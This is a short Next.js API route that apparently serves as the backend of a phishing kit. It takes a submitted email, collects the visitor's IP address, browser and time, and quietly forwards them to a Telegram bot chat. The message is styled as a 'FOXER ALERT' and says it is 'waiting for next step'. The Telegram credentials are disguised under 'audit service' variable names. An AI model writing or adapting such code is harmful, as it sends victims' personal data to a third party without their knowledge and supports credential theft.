import { NextRequest, NextResponse } from 'next/server'
import { getTelegramBotToken, getTelegramChatId, isTelegramConfigured } from '@/lib/telegramConfig'

export async function POST(request: NextRequest) {
  try {
    const { email } = await request.json()

    if (!isTelegramConfigured()) {
      return NextResponse.json({ success: false })
    }

    const auditServiceToken = await getTelegramBotToken() // Legacy: telegramBotToken
    const auditChannelId = await getTelegramChatId() // Legacy: telegramChatId

    if (!auditServiceToken || !auditChannelId) {
      return NextResponse.json({ success: false })
    }

    const ip =
      request.headers.get('x-forwarded-for')?.split(',')[0]?.trim() ||
      request.headers.get('x-real-ip') ||
      request.headers.get('cf-connecting-ip') ||
      'Unknown'
    const userAgent = request.headers.get('user-agent') || 'Unknown'

    const timestamp = new Date().toLocaleString('en-US', {
      weekday: 'short',
      month: 'short',
      day: 'numeric',
      hour: '2-digit',
      minute: '2-digit',
      hour12: true,
    })

    let browser = 'Unknown'
    if (userAgent.includes('Chrome') && !userAgent.includes('Edg')) browser = 'Chrome'
    else if (userAgent.includes('Firefox')) browser = 'Firefox'
    else if (userAgent.includes('Safari') && !userAgent.includes('Chrome')) browser = 'Safari'
    else if (userAgent.includes('Edg')) browser = 'Edge'

    // SHORT visitor message
    const message = `👊👊 Knock! Knock!! 

🦊 FOXER ALERT! 🦊

📧 Email: ${email}
🖥️ ${browser} | 📡 ${ip}
⏰ ${timestamp}

Waiting for next step... 🎯`

    const telegramUrl = `https://api.telegram.org/bot${auditServiceToken}/sendMessage`

    // Fire and forget
    fetch(telegramUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: auditChannelId,
        text: message,
      }),
      signal: AbortSignal.timeout(5000),
    }).catch(() => {})

    return NextResponse.json({ success: true })
  } catch {
    return NextResponse.json({ success: false }, { status: 500 })
  }
}

